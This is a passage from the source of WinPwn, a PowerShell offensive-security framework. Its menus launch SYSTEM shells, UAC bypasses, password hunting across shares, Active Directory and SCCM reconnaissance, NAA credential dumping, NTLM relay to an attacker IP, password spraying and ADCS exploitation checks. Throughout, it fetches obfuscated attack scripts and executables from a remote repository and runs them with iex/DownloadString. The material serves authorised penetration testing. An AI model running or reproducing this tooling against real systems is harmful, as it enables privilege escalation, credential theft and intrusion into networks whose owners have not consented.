            Get-ChildItem -Path $Directory -Filter *.dll -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> "$currentPath\DotNetBinaries.txt"} catch {} }
        }
        type "$currentPath\DotNetBinaries.txt"
        Sleep(4)
    }

}

function SYSTEMShell
{
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> SYSTEM Shellz @S3cur3Th1sSh1t

'@
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Pop System Shell using CreateProcess!'
        Write-Host -ForegroundColor Green '2. Bind System Shell using CreateProcess! '
        Write-Host -ForegroundColor Green '3. Pop System Shell using NamedPipe Impersonation! '
        Write-Host -ForegroundColor Green '4. Bind System Shell using UsoClient DLL load!'
    Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'
        Write-Host -ForegroundColor Green '6. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
        Switch ($masterquestion) 
        {
             1{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
             2{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
             3{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
             4{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
       5{iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}
       }
    }
  While ($masterquestion -ne 6)

}

function UACBypass
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [string]
        $command,
        [string]
        $technique   
    )

    if((!$consoleoutput) -or ($noninteractive)){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> UAC Bypass

'@
    if($noninteractive)
    {
        if ($technique -eq "ccmstp")
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uaccmstp.ps1')
            uaccmstp -BinFile $command
        }
        elseif($technique -eq "magic")
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uacmagic.ps1')
            uacmagic -BinPath $command
        }
        elseif ($technique -eq "DiskCleanup")
        {
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/diskcleanupuac.ps1')
            DiskCleanupBypass -command $command
        }
        return
    }
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. UAC Magic, specify Binary!'
        Write-Host -ForegroundColor Green '2. UAC Bypass ccmstp technique, specify Binary! '
        Write-Host -ForegroundColor Green '3. DiskCleanup UAC Bypass, specify Binary! '
        Write-Host -ForegroundColor Green '4. DccwBypassUAC technique, only cmd shell pop up!'
        Write-Host -ForegroundColor Green '5. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
        Switch ($masterquestion) 
        {
             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uacmagic.ps1'); uacmagic -BinPath $command}
             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/uaccmstp.ps1');uaccmstp -BinFile $command}
             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/diskcleanupuac.ps1');DiskCleanupBypass -command $command}
             4{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/dccuac.ps1')}
       }
    }
  While ($masterquestion -ne 5)

}

function Passhunt
{
  <#
        .DESCRIPTION
        Search for hashed or cleartext passwords on the local system or on the domain using Dionachs passhunt.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Local/Domain Recon / Privesc
    [CmdletBinding()]

    Param
    (
        [bool]
        $local,

        [bool]
        $domain,
        
        [Switch]
        $noninteractive
    )
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
        if ($domain)
        {
            if (!(Test-Path("$currentPath\DomainRecon\Windows_Servers.txt")))
            {
                Searchservers
            }

            if (!(Test-Path("$currentPath\DomainRecon\found_shares.txt")))
            {
                IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewobfs.ps1')
                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
                brainstorm -ComputerFile "$currentPath\DomainRecon\Windows_Servers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
                 
                $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
                $testShares > "$currentPath\DomainRecon\found_shares.txt"
            }
            else
            {
                $testShares = Get-Content -Path "$currentPath\DomainRecon\found_shares.txt"
            }
            Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
		if (!(test-path $currentPath\passhunt.exe))
		{
			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
			{
				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
			}
			else
			{
				Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/passhunt.exe -Outfile $currentPath\passhunt.exe
			}
		}
		foreach ($line in $testShares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
        -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
      g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                } 
       }
        if ($local)
        {
            if (!(test-path $currentPath\passhunt.exe))
			{
				if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
				{
					Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
				}
				else
				{
					Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/passhunt.exe -Outfile $currentPath\passhunt.exe
				}
			}
            
            cmd /c start powershell -Command "$currentPath\passhunt.exe"
            $sharepasshunt = "yes"
            if (!$noninteractive){$sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'}
            if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
            {
                $shares = (Get-PSDrive -PSProvider FileSystem).Root
                    
                foreach ($line in $shares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                } 
                                  
            }
        }
        else
        {
            if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
			{
				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
			}
			else
			{
				Invoke-WebRequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/passhunt.exe -Outfile $currentPath\passhunt.exe
			}
            cmd /c start powershell -Command "$currentPath\passhunt.exe -r '(password|passwort|passwd| -p | -p=| -pw |
      -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
    g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
        }

}

function Searchservers
{
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    # P0werspl0its p0werview obfuscated + string replaced
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewdevobfs.ps1')
    Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
    $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
    $ActiveServers.dnshostname >> "$currentPath\DomainRecon\Windows_Servers.txt"

}


function Domainreconmodules
{
  <#
        .DESCRIPTION
        All domain recon scripts are executed here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain / Network Recon
        [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
         
      
                 
       
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Domainreconmodules @S3cur3Th1sSh1t

'@
    if ($noninteractive -and (!$consoleoutput))
    {
        reconAD
        generaldomaininfo -noninteractive 
        sharphound -noninteractive 
        IEX($viewdevobfs)
        Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
        shareenumeration
        powerSQL -noninteractive
        MS17-10 -noninteractive
        zerologon -noninteractive
        passhunt -domain $true
        GPOAudit
        spoolvulnscan -noninteractive
        bluekeep -noninteractive
        printercheck -noninteractive
        RBCD-Check -noninteractive
        GPORemoteAccessPolicy -noninteractive
      Snaffler -noninteractive
        return;
    }
    elseif($noninteractive -and $consoleoutput)
    {
        generaldomaininfo -noninteractive -consoleoutput
        IEX($viewdevobfs)
        Find-InterestingDomainShareFile
        shareenumeration -consoleoutput
        powerSQL -noninteractive -consoleoutput
        MS17-10 -noninteractive -consoleoutput
        zerologon -noninteractive -consoleoutput
        spoolvulnscan -noninteractive -consoleoutput
        bluekeep -noninteractive -consoleoutput
        printercheck -noninteractive -consoleoutput
        RBCD-Check -noninteractive -consoleoutput
        GPORemoteAccessPolicy -noninteractive -consoleoutput
      Snaffler -noninteractive -consoleoutput
        return;
    }
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Collect general domain information!'
        Write-Host -ForegroundColor Green '2. ADRecon Report! '
        Write-Host -ForegroundColor Green '3. Collect Bloodhound information! '
        Write-Host -ForegroundColor Green '4. Search for potential sensitive domain share files! '
        Write-Host -ForegroundColor Green '5. Find some network shares without predefined filter! '
        Write-Host -ForegroundColor Green '6. Starting ACLAnalysis for Shadow Admin detection! '
        Write-Host -ForegroundColor Green '7. Start MS-RPRN RPC Service Scan! '
        Write-Host -ForegroundColor Green '8. Start PowerUpSQL Checks!'
        Write-Host -ForegroundColor Green '9. Search for MS17-10 vulnerable Windows Servers in the domain! '
        Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords! '
        Write-Host -ForegroundColor Green '11. Check domain Group policies for common misconfigurations using Grouper2! '
        Write-Host -ForegroundColor Green '12. Check domain Group policies for common misconfigurations using Grouper3! '
        Write-Host -ForegroundColor Green '13. Search for bluekeep vulnerable Windows Systems in the domain! '
        Write-Host -ForegroundColor Green '14. Search for potential vulnerable web apps (low hanging fruits)! '
        Write-Host -ForegroundColor Green '15. Check remote system groups via GPO Mapping! '
        Write-Host -ForegroundColor Green '16. Search for Systems with Admin-Access to pwn them! '
    Write-Host -ForegroundColor Green '17. Search for printers / potential vulns! '
    Write-Host -ForegroundColor Green '18. Search for Resource-Based Constrained Delegation attack paths! '
    Write-Host -ForegroundColor Green '19. Enumerate remote access policies through group policy! '
        Write-Host -ForegroundColor Green '20. Check all DCs for zerologon vulnerability! '
    Write-Host -ForegroundColor Green '21. Check users for empty passwords! '
    Write-Host -ForegroundColor Green '22. Check username=password combinations! '
        Write-Host -ForegroundColor Green '23. Get network interface IPs of all domain systems via IOXIDResolver! '
        Write-Host -ForegroundColor Green '24. Get the ADCS server(s) and templates + ESC8 Check! '
        Write-Host -ForegroundColor Green '25. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
        Write-Host -ForegroundColor Green '26. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
        Write-Host -ForegroundColor Green '27. Enumerate ADCS Template informations and permissions via Certify!'
        Write-Host -ForegroundColor Green '28. Check LDAP/LDAPS Signing and or Channel Binding'
        Write-Host -ForegroundColor Green '29. (Ab)use some SCCM stuff'
	Write-Host -ForegroundColor Green '30. Spray pre2k passwords'
    Write-Host -ForegroundColor Green '31. Use ShadowHound (ADModule - ADWS) to collect BH data'
    Write-Host -ForegroundColor Green '32. Use ShadowHound (LDAP search) to collect BH data'
        Write-Host -ForegroundColor Green '33. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{generaldomaininfo}
             2{reconAD}
             3{SharpHoundMenu}
             4{IEX($viewdevobfs)
             Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
             5{shareenumeration}
             6{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
             7{spoolvulnscan}
             8{powerSQL}
             9{MS17-10}
             10{domainshares}
             11{GPOAudit}
             12{Grouper3}
             13{bluekeep}
             14{fruit}
             15{groupsearch}
             16{latmov}
       17{printercheck}
       18{RBCD-Check}
       19{GPORemoteAccessPolicy}
         20{zerologon}
      21{Domainpassspray -emptypasswords}
      22{Domainpassspray -usernameaspassword}
         23{Oxidresolver}
         24{ADCSInfos}
         25{Invoke-RBDC-over-DAVRPC}
         26{Invoke-VulnerableADCSTemplates}
         27{Invoke-ADCSTemplateRecon}
         28{LDAPChecksMenu}
         29{SCCMMenu}
	 30{Domainpassspray -pre2k}
     31{shadowHound -adm}
     32{shadowhound}
       }
    }
  While ($masterquestion -ne 33)
}

function shadowHound
{

[CmdletBinding()]
    Param (
    [Switch]
        $adm
)

if ($adm)
{
    iex ($admodule)  
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ShadowHound-Adm.ps1')

     ShadowHound-ADM -OutputFilePath "$currentPath\DomainRecon\ldap_output_adws.txt" -SplitSearch -LetterSplitSearch


     Write-Host "Data collected, now you need to parse them with BofHound or split.py"
     Write-Host ""
     Write-Host "python3 bofhound.py -i ldap_output_adws.txt -p All --parser ldapsearch"
     Write-Host ""
     Write-Host "Depending on the file size (>100MB), you may want to split the output JSON file using tools like ShredHound"

}
else
{
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ShadowHound-DS.ps1')
    ShadowHound-DS -OutputFile "$currentPath\DomainRecon\ldap_output.txt"

     Write-Host "Data collected, now you need to parse them with BofHound or split.py"
     Write-Host ""
     Write-Host "python3 bofhound.py -i ldap_output.txt -p All --parser ldapsearch"
     Write-Host ""
     Write-Host "Depending on the file size (>100MB), you may want to split the output JSON file using tools like ShredHound"
}




}

function SCCMMenu
{
        do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> SCCM Actions
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green "1. Locate the SCCM Server if used! "
            Write-Host -ForegroundColor Green "2. Relay authentication from the SCCM server to your attacker system for Lateral Movement! "
            Write-Host -ForegroundColor Green "3. Get NAA Credentials via @xpn technique (https://blog.xpnsec.com/unobfuscating-network-access-accounts/)! "
            Write-Host -ForegroundColor Green "4. Dump and decrypt Network Access Account (NAA) credentials from the local SCCM client machine - needs local Admin (https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)! "
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{SCCMLocate}
                2{SCCMForceAuth}
                3{SCCMXPN}
                4{SCCMDumpNAA}
             }
        }
        While ($masterquestion -ne 5)

}

function SCCMLocate
{

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-MalSCCM.ps1')
    if(!$consoleoutput){$out = Invoke-MalSCCM locate; $out; $out >> "$currentPath\DomainRecon\SCCMServer.txt"}else{Invoke-MalSCCM locate}

}

function SCCMXPN
{

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
    if(!$consoleoutput){$out = Invoke-SharpSCCM -command "get naa -u WinPwn$ -p Aut0mat3S0mePentestT4sks!"; $out; $out >> "$currentPath\Exploitation\SCCMXpnCreds.txt"}else{Invoke-SharpSCCM -command "get naa -u WinPwn$ -p Aut0mat3S0mePentestT4sks!"}
    Write-Host "Dont forget to cleanup and REMOVE the WinPwn$ Computer Account!!!!!!!!!"
}

function SCCMDumpNAA
{

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    if (isadmin)
    {
        iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
        if(!$consoleoutput){$out = Invoke-SharpSCCM -command "local naa wmi"; $out; $out >> "$currentPath\Exploitation\SCCM_naa_Creds.txt"}else{Invoke-SharpSCCM -command "local naa wmi"}
    }
    else
    {
        Write-Host "No elevated prompt, you need local Admin Privs!"
    }
}

function SCCMForceAuth
{
    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $serverName = Read-Host -Prompt "Please enter the SCCM Server Hostname/IP: "
    $siteCode = Read-Host -Prompt "Please enter the SCCM Server Sitecode: "
    $relayIP = Read-Host -Prompt "Please enter your attacker IP (e.G. where Responder/Ntlmrelayx.py is running): "
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1')
    if(!$consoleoutput){$out = Invoke-SharpSCCM -command "$serverName $siteCode invoke client-push -t $relayIP"; $out >> "$currentPath\Exploitation\SCCMXpnCreds.txt"}else{Invoke-SharpSCCM -command "$serverName $siteCode invoke client-push -t $relayIP"}

}


function LDAPChecksMenu
{
        do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> LDAP Checks
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green "1. @klezVirus's SharpLdapRelayScan (requires username/password)! "
            Write-Host -ForegroundColor Green "2. @cube0x0's LdapSignCheck ! "
            Write-Host -ForegroundColor Green '3. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{SharpLdapRelayScan}
                2{LdapSignCheck}
             }
        }
        While ($masterquestion -ne 3)


}

function SharpLdapRelayScan
{
# Credit to https://github.com/klezVirus/SharpLdapRelayScan

    Param
    (   
        [Switch]
        $consoleoutput,
        [String]
        $username,
        [String]
        $password
    )
    if(!$consoleoutput){pathcheck}

    if([string]::IsNullOrEmpty($username))
    {
        $username = Read-Host -Prompt 'Please enter a valid username:'
    }
    if([string]::IsNullOrEmpty($password))
    {
        $password = Read-Host -Prompt 'Please enter a valid password:'
    }

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpLdapRelayScan.ps1')
    if(!$consoleoutput){Invoke-SharpLdapRelayScan -Command "-u $username -p $password" >> "$currentPath\DomainRecon\LDAPSigningInfos.txt"}else{Invoke-SharpLdapRelayScan -Command "-u $username -p $password"}


}

function LdapSignCheck
{

# Credit to https://github.com/cube0x0/LdapSignCheck

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-LdapSignCheck.ps1')
    if(!$consoleoutput){Invoke-LdapSignCheck -command "" >> "$currentPath\DomainRecon\LDAPSigningInfos.txt"}else{Invoke-LdapSignCheck -command ""}

}

function Invoke-ADCSTemplateRecon
{
    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX($Certify)

    Write-Host -ForegroundColor Yellow "Collecting general CA/ADCS informations!"
    if(!$consoleoutput){Invoke-Certify cas >> "$currentPath\DomainRecon\ADCS_Infos.txt"}else{Invoke-Certify cas}

    Write-Host -ForegroundColor Yellow "Checking enrolleeSuppliesSubject templates!"
    if(!$consoleoutput){Invoke-Certify find /enrolleeSuppliesSubject >> "$currentPath\DomainRecon\ADCS_enrolleeSuppliesSubject.txt"}else{Invoke-Certify find /enrolleeSuppliesSubject}

    Write-Host -ForegroundColor Yellow "Checking templates with Client authentication enabled!"
    if(!$consoleoutput){Invoke-Certify find /clientauth >> "$currentPath\DomainRecon\ADCS_ClientAuthTemplates.txt"}else{Invoke-Certify find /clientauth}

    Write-Host -ForegroundColor Yellow "Checking all templates permissions!"
    if(!$consoleoutput){Invoke-Certify find /showAllPermissions >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify find /showAllPermissions}

    Write-Host -ForegroundColor Yellow "Enumerate access control information for PKI objects!"
    if(!$consoleoutput){Invoke-Certify pkiobjects >> "$currentPath\DomainRecon\ADCS_Template_AllPermissions.txt"}else{Invoke-Certify pkiobjects}


    Write-Host -ForegroundColor Yellow "You should check the privileges/groups for enrollment and or for modification rights!"

}

function Invoke-VulnerableADCSTemplates
{

    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}

    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX($Certify)
    if(!$consoleoutput){Invoke-Certify find /vulnerable >> "$currentPath\Vulnerabilities\ADCSVulnerableTemplates.txt"}else{Invoke-Certify find /vulnerable}

}

function generaldomaininfo{
    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
     #Search for AD-Passwords in description fields
    Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
    
    iex ($admodule)            
    
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/adpass.ps1')

    if(!$consoleoutput){thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"}else{Write-Host -ForegroundColor Yellow '------->  Passwords in description fields:';thyme}

    
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')
    $domain_Name = skulked
    $Domain = $domain_Name.Name

    Write-Host -ForegroundColor Yellow '-------> Starting Domain Recon phase:'

    Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
    
    Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
    if(!$consoleoutput){inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"}else{inset}

    #P0werview functions, string replaced version
    Write-Host -ForegroundColor Yellow '------->  All those PowerView Network Skripts for later Lookup getting executed and saved:'
  if(!$consoleoutput){	
    try{
            skulked >> "$currentPath\DomainRecon\NetDomain.txt"
            televisions >> "$currentPath\DomainRecon\NetForest.txt"
            misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
            odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
            Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
            Randal >> "$currentPath\DomainRecon\NetSystems.txt"
          Get-Printer >> "$currentPath\DomainRecon\localPrinter.txt"
            damsels >> "$currentPath\DomainRecon\NetOU.txt"    
            xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
            ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
            reapportioned >> "$currentPath\DomainRecon\NetGroup.txt" 
            confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
            aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
            marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
            liberation >> "$currentPath\DomainRecon\NetShare.txt" 
            cherubs >> "$currentPath\DomainRecon\NetLoggedon"
            Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
            sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
            ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
            condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
        }catch{Write-Host "Got an error"}
        }
        else
        {
            try{
            Write-Host -ForegroundColor Yellow '------->  NetDomain'
            skulked
            Write-Host -ForegroundColor Yellow '------->  NetForest' 
            televisions
            Write-Host -ForegroundColor Yellow '------->  NetForestDomain'
            misdirects       
            Write-Host -ForegroundColor Yellow '------->  NetDomainController'
            odometer  
            Write-Host -ForegroundColor Yellow '------->  NetUser'
            Houyhnhnm     
            Write-Host -ForegroundColor Yellow '------->  NetSystems'
            Randal 
            Write-Host -ForegroundColor Yellow '------->  LocalPrinter'
          Get-Printer
            Write-Host -ForegroundColor Yellow '------->  NetOU'
            damsels
            Write-Host -ForegroundColor Yellow '------->  NetSite'     
            xylophone  
            Write-Host -ForegroundColor Yellow '------->  NetSubnet'
            ignominies 
            Write-Host -ForegroundColor Yellow '------->  NetGroup'
            reapportioned  
            Write-Host -ForegroundColor Yellow '------->  NetGroupMember'
            confessedly   
            Write-Host -ForegroundColor Yellow '------->  NetFileServer'
            aqueduct  
            Write-Host -ForegroundColor Yellow '------->  DFSShare'
            marinated  
            Write-Host -ForegroundColor Yellow '------->  NetShare'
            liberation  
            Write-Host -ForegroundColor Yellow '------->  NetLoggedon'
            cherubs 
            Write-Host -ForegroundColor Yellow '------->  DomainTrust'
            Trojans 
            Write-Host -ForegroundColor Yellow '------->  ForestTrust'
            sequined 
            Write-Host -ForegroundColor Yellow '------->  ForeigUser'
            ringer 
            Write-Host -ForegroundColor Yellow '------->  ForeignGroup'
            condor 
        }catch{Write-Host "Got an error"}
        }
  IEX ($viewdevobfs)
    if(!$consoleoutput){breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt"}else{Write-Host -ForegroundColor Yellow "------->  DomainPrinters";breviaries -Printers} 	        
  IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SPN-Scan.ps1')
  if(!$consoleoutput){Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"}else{Write-Host -ForegroundColor Yellow "------->  InterestingSPNs";Discover-PSInterestingServices}
  

  # Simple Script to check if RBCD could potentially be abused.
